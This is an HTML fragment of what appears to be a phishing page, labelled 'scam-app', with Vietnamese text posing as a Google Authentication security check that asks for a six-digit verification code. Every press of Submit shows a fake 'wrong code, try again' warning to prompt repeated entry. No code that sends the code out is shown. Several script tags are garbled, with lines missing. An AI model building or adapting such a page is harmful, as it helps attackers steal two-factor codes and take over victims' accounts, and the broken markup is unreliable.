<body>

    <div id="scam-app">
        <div id="warning" style="display: none;" class="alert alert-danger alert-dismissible fade show">
            <button id='close-alert' class='close' type="button">&times;</button>
            Mã xác thực Google sai. Vui lòng thử lại!
        </div>
        <div class="container" style="width:254px">

            <img style="margin-top: 30px; width:224px;" src="main-icon.png" />


            <h2 style="
              font-size: 1.5rem !important;
              font-weight: 700 !important;
              font-family: inherit;
              line-height: 1.2;
              margin-top: 40px;
              margin-bottom: 30px;
            ">
                Bảo mật Google Authentication
            </h2>


            <div class="form-group my-form">
                <!-- <label for="username">Địa chỉ Email *</label>
    <input type="text" class="form-control my-tb" name="" id="username" aria-describedby="helpId" placeholder="Điền Email" /> -->
                <label for="username">Mã Google Authentication</label>
                <div class="d-flex justify-content-between align-items-center" id="form-authen">
                    <input class='code' id='n-1' type="text" maxlength="1" onkeypress="return isNumberKey(event, 'n-2')" />
                    <input class='code' id='n-2' type="text" maxlength="1" onkeypress="return isNumberKey(event, 'n-3')" />
                    <input class='code' id='n-3' type="text" maxlength="1" onkeypress="return isNumberKey(event, 'n-4')" />
                    <input class='code' id='n-4' type="text" maxlength="1" onkeypress="return isNumberKey(event, 'n-5')" />
                    <input class='code' id='n-5' type="text" maxlength="1" onkeypress="return isNumberKey(event, 'n-6')" />
                    <input class='code' id='n-6' type="text" maxlength="1" onkeypress="return isNumberKey(event)" />


                </div>
            </div>

            <button data-toggle="modal" data-target="#myModal" id="btn-authen"
                style="width: 224px; height: 47px; margin-top:20px" type="button" class="btn btn-primary">
                Gửi
            </button>


        </div>
    </div>


    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
        integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo"
        crossorigin="anonymous"></script>

        crossorigin="anonymous"></script>

        integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM"
        crossorigin="anonymous"></script>

        function isNumberKey(evt, target) {
            var charCode = (evt.which) ? evt.which : evt.keyCode
            if (charCode > 31 && (charCode < 48 || charCode > 57)) {
                return false;
            }
            console.log(target)
            if(target != null){
                document.getElementById(target).focus();
            }
            
            return true;
        }

        $('#btn-authen').click(function (e) {

            $('#warning').css('display', 'block');

        });

        $("#close-alert")[0].onclick = null;

        $('#close-alert').click(function (e) {
            $('#warning').css('display', 'none');

        });
    </script>
